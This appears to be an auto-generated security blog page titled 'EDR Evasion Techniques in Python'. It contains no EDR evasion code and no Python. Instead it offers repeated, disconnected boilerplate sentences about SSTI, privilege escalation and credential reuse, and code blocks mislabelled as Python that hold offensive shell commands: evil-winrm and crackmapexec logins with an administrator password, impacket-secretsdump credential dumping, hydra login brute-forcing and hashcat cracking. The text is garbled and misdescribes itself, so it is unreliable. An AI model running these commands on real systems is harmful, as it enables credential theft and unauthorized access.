---
TitleSEO: "EDR Evasion Techniques in Python | ZureFX"
TitlePost: "EDR Evasion Techniques — Python"
Author: "ZureFX"
Description: "A Python script for edr evasion techniques. Built for security research and automation."
Keywords: "powershell, python, c, tool, go, scanner"
URL: "https://zurefx.github.io/scripting/script-edr-evasion-techniques-528.html"
URL_IMAGES: ""
Date: "2025-11-23"
Tags: "PowerShell, Python, C, Tool, Go, Scanner"
Section: "scripting"
Lang: "en"
main_img: "script-edr-evasion-techniques-528"
Permalink: "/scripting/script-edr-evasion-techniques-528.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **Python** for offensive security automation.

### Requirements

- Python
- `GetUserSPNs`
- `chisel`
- `smbclient`

## Implementation

### Core Logic

The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services.

```python
evil-winrm -i 10.40.53.90 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.15.126.140 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Helper Functions

The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism.

```python
feroxbuster -h
evil-winrm -i 10.65.24.158 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.127.234.108
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.69.121.167 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.62.95.234/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Advanced Options

Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.128.29.13 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.62.3.71 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

The application stored sensitive credentials in an unencrypted configuration file. The web application was vulnerable to Server-Side Template Injection (SSTI).

```
[+] Scanning target...
[+] Found 12 results
[+] Done in 6.81s
```
